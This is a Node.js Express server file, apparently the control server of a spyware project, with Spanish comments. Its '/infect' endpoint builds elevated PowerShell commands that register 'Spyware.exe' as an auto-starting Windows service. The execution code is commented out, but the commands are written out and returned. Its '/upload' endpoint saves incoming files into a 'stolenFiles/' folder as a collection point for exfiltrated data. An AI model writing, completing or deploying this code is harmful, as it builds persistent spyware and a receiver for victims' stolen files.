import { exec } from 'child_process';
import { ftp } from '../ftp/fptSrv.js';
import cors from 'cors';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import multer from 'multer';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);



const app = express();
app.use(express.json());
app.use(cors());
const PORT = 3000;

// Configuración de multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'stolenFiles/');
    },
    filename: (req, file, cb) => {
        cb(null, `${Date.now()}-${file.originalname}`);
    }
});
const upload = multer({ storage });

app.get('/infect', (req, res) => {
    const spywareExePath = path.join(__dirname, '../Spyware.exe');
    const installServPath = path.join(__dirname, '../commands/installServ.bat');
    const startServPath = path.join(__dirname, '../commands/exec_startServ.bat');
    console.log('Infecting...');
    console.log('Spyware path:', spywareExePath);
    const installServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'create Spyware binPath= \\"${spywareExePath}\\" start= auto' -Verb runAs"`;
    const startServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'start Spyware' -Verb runAs"`;

    res.status(200).json({
        message: 'Infection successful',
        spywarePath: spywareExePath,
        installServCmd,
        startServCmd
    });

    // Ejecutar el script de instalación del servicio
    // exec(installServCmd, (error, stdout, stderr) => {
    //     if (error) {
    //         console.error(`Error ejecutando installServ.bat: ${error.message}`);
    //         return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
    //     }
    //     if (stderr) {
    //         console.error(`Stderr en installServ.bat: ${stderr}`);
    //     }
    //     console.log(`Resultado installServ.bat: ${stdout}`);

    //     // Esperar 2 segundos antes de iniciar el servicio
    //     setTimeout(() => {
    //         exec(`"${startServPath}"`, (error, stdout, stderr) => {
    //             if (error) {
    //                 console.error(`Error ejecutando startServ.bat: ${error.message}`);
    //                 return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
    //             }
    //             if (stderr) {
    //                 console.error(`Stderr en startServ.bat: ${stderr}`);
    //             }
    //             console.log(`Resultado startServ.bat: ${stdout}`);
    //             res.status(200).json({
    //                 message: 'Infection successful',
    //                 spywarePath: spywareExePath
    //             });
    //         });
    //     }, 2000);
    // });
});

app.post('/upload', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }
    console.log(`File uploaded: ${req.file.filename}`);
    res.send(`File uploaded: ${req.file.filename}`);
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    // ftp.start().then(() => {
    //     console.log('FTP server started successfully');
    // }).catch((error) => {
    //     console.error('Failed to start FTP server:', error);
    // });
});
